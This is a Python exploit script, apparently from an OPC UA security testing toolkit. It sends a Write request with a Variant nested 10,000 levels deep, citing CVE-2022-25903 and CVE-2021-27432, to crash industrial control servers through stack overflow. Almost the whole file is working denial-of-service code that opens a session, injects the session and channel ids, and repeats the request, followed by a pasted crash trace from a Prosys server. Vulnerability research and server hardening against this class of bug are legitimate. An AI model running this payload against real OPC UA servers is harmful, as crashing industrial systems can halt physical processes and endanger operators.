# Complex Nested NodeID Attack
#   Sending a complex nested variant node id (e.g. array of array of array..) which in some cases triggers CallStackOverflow exceptions if the server doesn't limit
#
# CVEs:
#   - CVE-2022-25903: https://security.snyk.io/vuln/SNYK-RUST-OPCUA-2988750
#   - CVE-2021-27432: https://www.cisa.gov/uscert/ics/advisories/icsa-21-133-03
#
# Other behaviour:
# On Prosys we will get a "StackOverflow" stack trace:
#   Exception: Got OPC UA Error: b'\x00\x00\x07\x80`\x07\x00\x00Bad_DecodingError (code=0x80070000, description="
#       Stack overflow: [com.prosysopc.ua.stack.utils.a.k.read(SourceFile:145), com.prosysopc.ua.stack.utils.a.l.crW(SourceFile:187), com.prosysopc.ua.stack.utils.a.l.crx(SourceFile:49), com.prosysopc.ua.stack.encoding.binary.a.jO(SourceFile:1695), com.prosysopc.ua.stack.encoding.binary.a.jP(SourceFile:1804), com.prosysopc.ua.stack.encoding.binary.a.n(SourceFile:583), com.prosysopc.ua.stack.encoding.binary.a.jO(SourceFile:1711), com.prosysopc.ua.stack.encoding.binary.a.jP(SourceFile:1804), com.prosysopc.ua.stack.encoding.binary.a.n(SourceFile:583), com.prosysopc.ua.stack.encoding.binary.a.jO(SourceFile:1711), com.prosysopc.ua.stack.encoding.binary.a.jP(SourceFile:1804), com.prosysopc.ua.stack.encoding.binary.a.n(SourceFile:583), com.prosysopc.ua.stack.encoding.binary.a.jO(SourceFile:1711), com.prosysopc.ua.stack.encoding.binary.a.jP(SourceFile:1804), com.prosysopc.ua.stack.encoding.binary.a.n(SourceFile:583), com.prosysopc.ua.stack.encoding.binary.a.jO(SourceFi'

import datetime

from protocol import *
from config import *

NUM_OF_NESTED_CRASH = 10_000

# Send Variant of Variant of Variant of Variant ...
def attack(server_details, num_requests=1, num_of_nested=NUM_OF_NESTED_CRASH):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    ### Build Message ###
    # 01000000 - array size of 1
    # Type: VariantArray (0x98)
    one_item_variant_array = bytes.fromhex("0100000098")
    # 1 variant array with one variant array with one variant array x times
    variants = one_item_variant_array * num_of_nested
    # Write request
    message_header = opcua.build_opcua_message_header()
    # Write request with nodes to write: Array of Write Value. Write value is node id of type 'Array of Variant' --> 'Array of Variant' --> 'Array of Variant'...
    message_body = bytes.fromhex("0100a102020000e6446a730d451106c0dbd70171000000ff030000ffffffff00000000000000010000000302001a00000044656d6f2e44796e616d69632e4172726179732e537472696e670d000000ffffffff01")
    message_body += b"\x98" # Variant Type: Array of Variant (0x98)
    message_body += variants # Variants (nested)

    node_id_len = get_node_id_len_from_packet(message_body)

    # Create write request with correct session and channel id's
    msg_write = bytearray(message_body)
    msg_write[4:4+node_id_len] = OBJECT.build(opcua.auth_id)
    msg_write = bytearray(message_header) + msg_write
    msg_write[8:12] = struct.pack("I", opcua.secure_channel_id)
    msg_write[12:16] = struct.pack("I", opcua.secure_token_id)
    ##################

    # Send num_requests times
    print("[-] Sending MSG Request - Complex nested ({} nested) x {} times".format(num_of_nested, num_requests))
    resp = opcua.send_recv(msg_write, num_requests, should_recv=True)
    print(resp[61:])

    print("[-] Sleeping 0.5 seconds to make sure all chunks are received")
    time.sleep(0.5)

    print("[-] Closing connection")
    opcua.close()
